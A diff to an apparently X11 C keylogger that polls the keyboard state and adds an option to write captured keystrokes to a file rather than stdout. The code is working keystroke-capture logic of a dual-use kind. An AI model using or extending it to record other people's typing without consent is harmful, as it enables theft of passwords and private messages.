@@ -115,11 +115,21 @@ int main(int argc, char *argv[])
         return 1;
     }
     
+    // Open output file
+    FILE *file = stdout;
+    if (option_file) {
+        file = fopen(option_file, "w");
+        if (!file) {
+            perror(option_file);
+            exit(1);
+        }
+    }
+    
     char keys_current[32], keys_last[32];
     
     XQueryKeymap(display, keys_last);
     while (!end) {
-        fflush(stdout);
+        fflush(file);
         usleep(5000);
         
         XQueryKeymap(display, keys_current);
@@ -128,13 +138,14 @@ int main(int argc, char *argv[])
                 int keycode = i * 8 + bit_offset(keys_current[i] ^ keys_last[i]);
                 int keysym = XKeycodeToKeysym(display, keycode, 0);
                 char *key = XKeysymToString(keysym);
-                printf("%c%s ", (keys_current[i] == 0) ? '-' : '+', key);
+                fprintf(file, "%c%s ", (keys_current[i] == 0) ? '-' : '+', key);
             }
             keys_last[i] = keys_current[i];
         }
     }
     
     XCloseDisplay(display);
+    fclose(file);
     
     return 0;
 }
